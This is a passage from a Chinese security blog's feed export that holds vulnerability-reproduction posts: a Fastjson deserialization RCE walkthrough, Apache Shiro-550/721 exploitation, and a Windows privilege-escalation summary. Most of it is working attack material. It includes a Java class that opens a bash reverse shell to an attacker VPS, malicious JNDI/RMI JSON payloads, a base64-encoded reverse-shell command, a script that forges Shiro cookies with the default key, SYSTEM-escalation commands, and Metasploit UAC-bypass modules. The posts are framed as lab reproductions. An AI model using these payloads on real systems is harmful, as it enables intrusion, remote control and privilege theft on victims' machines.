href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>需要环境</strong></p><p>在本机提前安装好maven和jdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>漏洞复现</strong></p><p>使用vulhub搭建漏洞环境</p><pre><code class="text">docker-compose up d</code></pre><p>访问xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>保存以下代码</p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPS的IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>编译为Exploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>使用python在当前目录下起一个http服务，如果端口占用换其他的</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests</code></pre><p>以我搭建Exploit.class类http服务的服务器IP为2.2.2.2端口为4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMI服务可以搭建在与Exploit.class类的http服务同一台服务器，也可以搭建在其它服务器上。我们演示还是在同一台。</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>环境已经搭建好，接下来使用burp开始</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: 目标ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vps的ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>如图即代表攻击成功</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMI服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>python搭建的http服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>和fastjson1.2.24差不多，就是poc不一样而已</p><p><strong>影响版本</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>漏洞检测</strong></p><p>检测方式和1.2.24一样</p><p>漏洞利用</p><p>创建恶意类，python搭建服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>搭建RMI服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>发送的数据包改为即可</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #靶机地址Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPS地址:端口/Exploit&quot;,  #这里的Exploit不能变        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=Fastjson&amp;spm=1001.2101.3001.7</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="fastjson" scheme="https://sakurahack-y.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>shiro漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-15T09:11:24.000Z</published>
    <updated>2022-03-15T12:30:46.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h1><p><strong>影响版本:Apache Shiro &lt; 1.2.4</strong></p><p><strong>漏洞原理：</strong>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p><strong>特征判断</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><p><strong>环境搭建</strong></p><pre><code class="text">获取docker镜像docker pull medicean/vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>工具准备</strong></p><p>maven配置:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3在/etc/profile末尾添加maven环境变量:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>下载ysoserial并打包:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>生成的工具在ysoserial/target文件中。</p><p><strong>复现流程</strong></p><p><strong>1、检查是否存在默认的key</strong></p><p>推荐使用Shiro_exploit检测:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>如图成功获取密钥</p><p><strong>2、nc监听本地端口</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3、编写反弹shell代码</strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#进行base64编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4、通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5、使用shiro.py生成payload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:注意shiro.py要在target目录下</p><p><strong>6、构造数据包，伪造cookie，发送Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>用上文产生的payload进行替换</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>发送</p><p><strong>7、成功反弹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721）"></a>Shiro Padding Oracle Attack（Shiro-721）</h1><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>影响版本：Apache Shiro &lt; 1.4.2版本。</p><p><strong>漏洞利用：</strong><br>1、登录Shiro网站，从cookie中获得rememberMe字段的值。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2、利用DNSlog探测，通过ysoserial工具payload。</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>爆破成功，输出Result：</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4、使用构造的rememberMe攻击字符串重新请求网站<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5、成功触发Payload，在DNSLog获取到目标IP。<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="一键自动化漏洞利用工具"><a href="#一键自动化漏洞利用工具" class="headerlink" title="一键自动化漏洞利用工具"></a>一键自动化漏洞利用工具</h1><p>ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。<br>Github项目地址：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>参考链接:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="shrio" scheme="https://sakurahack-y.github.io/tags/shrio/"/>
    
  </entry>
  
  <entry>
    <title>windows提权总结</title>
    <link href="https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-12T13:09:18.000Z</published>
    <updated>2022-03-12T17:28:24.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>为什么要提权：当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行管理员权限下的一下命令或者读取一些重要文件。这个时候就需要提权，在管理员权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。特别是windows存在域，所以需要最高权限，更方便后续的渗透。</p><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p><p>Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等</p><h1 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h1><p>知己知彼，百战不殆</p><p>当以低权用户进去一个陌生的windows机器后，无论是提权还是后续做什么，第一步肯定要尽可能的搜集信息。</p><h2 id="常规信息搜集-1"><a href="#常规信息搜集-1" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h2><pre><code class="text">systeminfo 查询系统信息  hostname 主机名  net user 查看用户信息  netstat -ano|find &quot;3389&quot; 查看服务pid号  wmic os get caption 查看系统名  wmic qfe get Description,HotFixID,InstalledOn 查看补丁信息  wmic product get name,version 查看当前安装程序  wmic service list brief 查询本机服务  wmic process list brief 查询本机进程  net share 查看本机共享列表  netsh firewall show config 查看防火墙配置</code></pre><h2 id="常见的杀软如下："><a href="#常见的杀软如下：" class="headerlink" title="常见的杀软如下："></a>常见的杀软如下：</h2><pre><code class="text">360sd.exe 360杀毒  360tray.exe 360实时保护  ZhuDongFangYu.exe 360主动防御  KSafeTray.exe 金山卫士  SafeDogUpdateCenter.exe 安全狗  McAfee McShield.exe McAfee  egui.exe NOD32  AVP.exe 卡巴斯基  avguard.exe 小红伞  bdagent.exe BitDefender</code></pre><h2 id="要搜集的信息大致如下几点："><a href="#要搜集的信息大致如下几点：" class="headerlink" title="要搜集的信息大致如下几点："></a>要搜集的信息大致如下几点：</h2><pre><code class="text">机器的系统及其版本机器的打补丁情况机器安装的服务机器的防火墙策略配置机器的防护软件情况</code></pre><h1 id="提权漏洞"><a href="#提权漏洞" class="headerlink" title="提权漏洞"></a>提权漏洞</h1><h2 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h2><h3 id="手工查找补丁情况"><a href="#手工查找补丁情况" class="headerlink" title="手工查找补丁情况"></a>手工查找补丁情况</h3><pre><code class="text">systeminfo  #查看补丁wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息#Powershell扫描Import-Module C:\Sherlock.ps1Find-AllVulns</code></pre><h3 id="MSF后渗透扫描"><a href="#MSF后渗透扫描" class="headerlink" title="MSF后渗透扫描"></a>MSF后渗透扫描</h3><pre><code class="text">post/windows/gather/enum_patches</code></pre><p>利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权</p><h2 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h2><p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将Administrator权限提升至system权限。</strong></p><p>AT命令是Windows XP中内置的命令，它也可以媲美Windows中的”计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><p>因为at命令默认是以system权限下运行的所以我们可以利用以下命令，进行提权</p><p>at 时间 /interactive cmd 其中里面的/interactive参数是开启交互模式</p><p>设置一个定时任务，到时间后自动弹出一个cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225229034.png" alt="image-20220312225229034"></p><p>此时桌面还是</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225516674.png" alt="image-20220312225516674"></p><p>利用system权限打开任务管理器，结束桌面进程</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225723090.png" alt="image-20220312225723090"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225450882.png" alt="image-20220312225450882"></p><p>再重新打开</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225804841.png" alt="image-20220312225804841"></p><p>由此可以实现与msf的联动</p><p>在webshll的cmd中执行  at 时间 /interactive msf的后门程序。(注：这里的权限一定要是Administrator)</p><p>会直接反弹回system权限的会话</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312230306281.png" alt="image-20220312230306281"></p><h2 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h2><p><strong>适用于windows 7/8、03/08、12/16</strong></p><p>因为at命令在win7，win8等更高版本的系统上都已经取消掉了，所以在一些更高版本的windows操作系统上我们可以用sc命令进行提权</p><p>SC命令是XP系统中功能强大的DOS命令,SC命令能与”服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>也就是说 就是sc可以启动一个服务</p><p>提权命令</p><pre><code class="text">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact #设置一个启动cmd窗口的服务sc start systemcmd # 启动该服务创建一个名叫syscmd的cmd服务，我们也可以把binPath换成木马的路径，这样就可以获得一个system权限的会话</code></pre><p>其中systemcmd是服务名称，可以随意填写，binpath是启动的命令，type=own是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312231452287.png" alt="image-20220312231452287"></p><h2 id="psexec提权"><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h2><p>**适用版本：Win2003 &amp; Win2008 **</p><p><strong>微软官方工具包</strong>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><strong>提权命令</strong>：</p><pre><code class="text">PsExec.exe /accepteula /s \\127.0.0.1 cmd #直接交互式shellpsexec.exe -accepteula -s -i -d cmd.exe #弹出一个cmd窗口</code></pre><p>开启的cmd窗口也是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312232849689.png" alt="image-20220312232849689"></p><h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><h3 id="UAC简介"><a href="#UAC简介" class="headerlink" title="UAC简介"></a><strong>UAC简介</strong></h3><p><strong>1.什么是用户帐户控制(UAC)？</strong></p><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p><p>换句话说，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><strong>2.UAC如何运行？</strong></p><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被”提升权限”，而不是以管理员身份运行的程序。</p><p>一些没有管理员权限无法完成的操作：</p><ul><li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间（时钟）</li><li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li><li>修改受保护的目录（例如Windows文件夹，Program Files）</li><li>计划任务（例如，以管理员权限自动启动）</li></ul><p><strong>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</strong> </p><p><strong>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</strong></p><p>如果不是system权限，我们可以通过以下绕过UAC模块对UAC进行绕过，在通过<strong>getsystem进行提权</strong></p><pre><code class="text">#Msfexploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_comhijack</code></pre><h3 id="Windows权限升级绕过UAC保护"><a href="#Windows权限升级绕过UAC保护" class="headerlink" title="Windows权限升级绕过UAC保护"></a><strong>Windows权限升级绕过UAC保护</strong></h3><p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit</code></pre><p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在以下命令以确定system权限特权.</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235547978.png" alt="image-20220312235547978"></p><h3 id="Windows权限提升绕过UAC保护（内存注入）"><a href="#Windows权限提升绕过UAC保护（内存注入）" class="headerlink" title="Windows权限提升绕过UAC保护（内存注入）"></a><strong>Windows权限提升绕过UAC保护（内存注入）</strong></h3><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload  二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235641548.png" alt="image-20220312235641548"></p><h3 id="绕过Windows-UAC保护（通过FodHelper注册表项）"><a href="#绕过Windows-UAC保护（通过FodHelper注册表项）" class="headerlink" title="绕过Windows UAC保护（通过FodHelper注册表项）"></a><strong>绕过Windows UAC保护（通过FodHelper注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235727956.png" alt="image-20220312235727956"></p><h3 id="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"><a href="#Windows权限升级绕过UAC保护（通过Eventvwr注册表项）" class="headerlink" title="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"></a><strong>Windows权限升级绕过UAC保护（通过Eventvwr注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235806004.png" alt="image-20220312235806004"></p><h3 